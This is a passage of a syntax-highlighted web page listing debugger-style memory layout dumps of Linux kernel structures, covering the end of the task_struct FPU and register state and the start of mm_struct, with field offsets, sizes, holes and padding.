</span></span><span class="line"><span class="cl"><span class="cm">/* 5524      |     4 */</span>        <span class="n">u32</span> <span class="n">pkru</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 40-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5568      |  4224 */</span>        <span class="k">struct</span> <span class="n">fpu</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5568      |     4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">last_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5576      |     8 */</span>            <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">avx512_timestamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5584      |     8 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="o">*</span><span class="n">fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5592      |     8 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="o">*</span><span class="n">__task_fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5600      |    16 */</span>            <span class="k">struct</span> <span class="n">fpu_state_perm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5600      |     8 */</span>                <span class="n">u64</span> <span class="n">__state_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5608      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5612      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__user_state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5616      |    16 */</span>            <span class="k">struct</span> <span class="n">fpu_state_perm</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5616      |     8 */</span>                <span class="n">u64</span> <span class="n">__state_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5624      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5628      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">__user_state_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">guest_perm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5632      |  4160 */</span>            <span class="k">struct</span> <span class="n">fpstate</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5632      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5636      |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">user_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5640      |     8 */</span>                <span class="n">u64</span> <span class="n">xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5648      |     8 */</span>                <span class="n">u64</span> <span class="n">user_xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5656      |     8 */</span>                <span class="n">u64</span> <span class="n">xfd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 0   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_valloc</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 1   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_guest</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 2   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">is_confidential</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5664: 3   |     4 */</span>                <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nl">in_use</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-bit hole   */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 31-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |  4096 */</span>                <span class="k">union</span> <span class="n">fpregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               112 */</span>                    <span class="k">struct</span> <span class="n">fregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     4 */</span>                        <span class="n">u32</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     4 */</span>                        <span class="n">u32</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                        <span class="n">u32</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                        <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                        <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                        <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |    80 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5804      |     4 */</span>                        <span class="n">u32</span> <span class="n">status</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  112 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">fsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               512 */</span>                    <span class="k">struct</span> <span class="n">fxregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     2 */</span>                        <span class="n">u16</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5698      |     2 */</span>                        <span class="n">u16</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     2 */</span>                        <span class="n">u16</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5702      |     2 */</span>                        <span class="n">u16</span> <span class="n">fop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |    16 */</span>                        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     8 */</span>                                <span class="n">u64</span> <span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     8 */</span>                                <span class="n">u64</span> <span class="n">rdp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                            <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                                <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                                <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                                <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                                <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  8-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">mxcsr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |     4 */</span>                        <span class="n">u32</span> <span class="n">mxcsr_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5728      |   128 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5856      |   256 */</span>                        <span class="n">u32</span> <span class="n">xmm_space</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6112      |    48 */</span>                        <span class="n">u32</span> <span class="n">padding</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6160      |    48 */</span>                        <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                            <span class="n">u32</span> <span class="n">padding1</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                            <span class="n">u32</span> <span class="n">sw_reserved</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  512 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">fxsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               136 */</span>                    <span class="k">struct</span> <span class="n">swregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     4 */</span>                        <span class="n">u32</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     4 */</span>                        <span class="n">u32</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                        <span class="n">u32</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                        <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                        <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                        <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                        <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |    80 */</span>                        <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5804      |     1 */</span>                        <span class="n">u8</span> <span class="n">ftop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5805      |     1 */</span>                        <span class="n">u8</span> <span class="n">changed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5806      |     1 */</span>                        <span class="n">u8</span> <span class="n">lookahead</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5807      |     1 */</span>                        <span class="n">u8</span> <span class="n">no_update</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5808      |     1 */</span>                        <span class="n">u8</span> <span class="n">rm</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5809      |     1 */</span>                        <span class="n">u8</span> <span class="n">alimit</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5816      |     8 */</span>                        <span class="k">struct</span> <span class="n">math_emu_info</span> <span class="o">*</span><span class="n">info</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5824      |     4 */</span>                        <span class="n">u32</span> <span class="n">entry_eip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  136 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">soft</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*               576 */</span>                    <span class="k">struct</span> <span class="n">xregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |   512 */</span>                        <span class="k">struct</span> <span class="n">fxregs_state</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5696      |     2 */</span>                            <span class="n">u16</span> <span class="n">cwd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5698      |     2 */</span>                            <span class="n">u16</span> <span class="n">swd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5700      |     2 */</span>                            <span class="n">u16</span> <span class="n">twd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5702      |     2 */</span>                            <span class="n">u16</span> <span class="n">fop</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |    16 */</span>                            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     8 */</span>                                    <span class="n">u64</span> <span class="n">rip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     8 */</span>                                    <span class="n">u64</span> <span class="n">rdp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                           <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                16 */</span>                                <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5704      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5708      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fcs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5712      |     4 */</span>                                    <span class="n">u32</span> <span class="n">foo</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5716      |     4 */</span>                                    <span class="n">u32</span> <span class="n">fos</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                           <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                       <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  8-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5720      |     4 */</span>                            <span class="n">u32</span> <span class="n">mxcsr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5724      |     4 */</span>                            <span class="n">u32</span> <span class="n">mxcsr_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5728      |   128 */</span>                            <span class="n">u32</span> <span class="n">st_space</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5856      |   256 */</span>                            <span class="n">u32</span> <span class="n">xmm_space</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6112      |    48 */</span>                            <span class="n">u32</span> <span class="n">padding</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6160      |    48 */</span>                            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                                <span class="n">u32</span> <span class="n">padding1</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                48 */</span>                                <span class="n">u32</span> <span class="n">sw_reserved</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                       <span class="cm">/* total size (bytes):   48 */</span>
</span></span><span class="line"><span class="cl">                                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):  512 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">}</span> <span class="n">i387</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6208      |    64 */</span>                        <span class="k">struct</span> <span class="n">xstate_header</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6208      |     8 */</span>                            <span class="n">u64</span> <span class="n">xfeatures</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6216      |     8 */</span>                            <span class="n">u64</span> <span class="n">xcomp_bv</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6224      |    48 */</span>                            <span class="n">u64</span> <span class="n">reserved</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                                   <span class="cm">/* total size (bytes):   64 */</span>
</span></span><span class="line"><span class="cl">                                               <span class="p">}</span> <span class="n">header</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 6272      |     0 */</span>                        <span class="n">u8</span> <span class="n">extended_state_area</span><span class="p">[];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                               <span class="cm">/* total size (bytes):  576 */</span>
</span></span><span class="line"><span class="cl">                                           <span class="p">}</span> <span class="n">xsave</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*              4096 */</span>                    <span class="n">u8</span> <span class="n">__padding</span><span class="p">[</span><span class="mi">4096</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX 4032-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                           <span class="cm">/* total size (bytes): 4096 */</span>
</span></span><span class="line"><span class="cl">                                       <span class="p">}</span> <span class="n">regs</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes): 4160 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">__fpstate</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes): 4224 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">fpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 4416 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="kr">thread</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                           <span class="cm">/* total size (bytes): 9792 */</span>
</span></span><span class="line"><span class="cl">                         <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="mm_struct">mm_struct</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/* offset    |  size */</span>  <span class="n">type</span> <span class="o">=</span> <span class="k">struct</span> <span class="n">mm_struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |  1232 */</span>    <span class="k">struct</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |    24 */</span>        <span class="k">struct</span> <span class="n">maple_tree</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    0      |     4 */</span>            <span class="k">union</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 4 */</span>                <span class="kt">spinlock_t</span> <span class="n">ma_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*                 0 */</span>                <span class="n">lockdep_map_p</span> <span class="n">ma_external_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*    8      |     8 */</span>            <span class="kt">void</span> <span class="o">*</span><span class="n">ma_root</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   16      |     4 */</span>            <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">ma_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   24 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">mm_mt</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   24      |     8 */</span>        <span class="kt">unsigned</span> <span class="nf">long</span> <span class="p">(</span><span class="o">*</span><span class="n">get_unmapped_area</span><span class="p">)(</span><span class="k">struct</span> <span class="n">file</span> <span class="o">*</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   32      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   40      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_legacy_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   48      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_compat_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   56      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mmap_compat_legacy_base</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   64      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">task_size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   72      |     8 */</span>        <span class="kt">pgd_t</span> <span class="o">*</span><span class="n">pgd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   80      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">membarrier_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   84      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">mm_users</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   88      |     4 */</span>        <span class="kt">atomic_t</span> <span class="n">mm_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*   96      |     8 */</span>        <span class="k">struct</span> <span class="n">mm_cid</span> <span class="o">*</span><span class="n">pcpu_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  104      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mm_cid_next_scan</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  112      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">pgtables_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  120      |     4 */</span>        <span class="kt">int</span> <span class="n">map_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  124      |     4 */</span>        <span class="kt">spinlock_t</span> <span class="n">page_table_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/*  128      |    40 */</span>        <span class="k">struct</span> <span class="n">rw_semaphore</span> <span class="p">{</span>
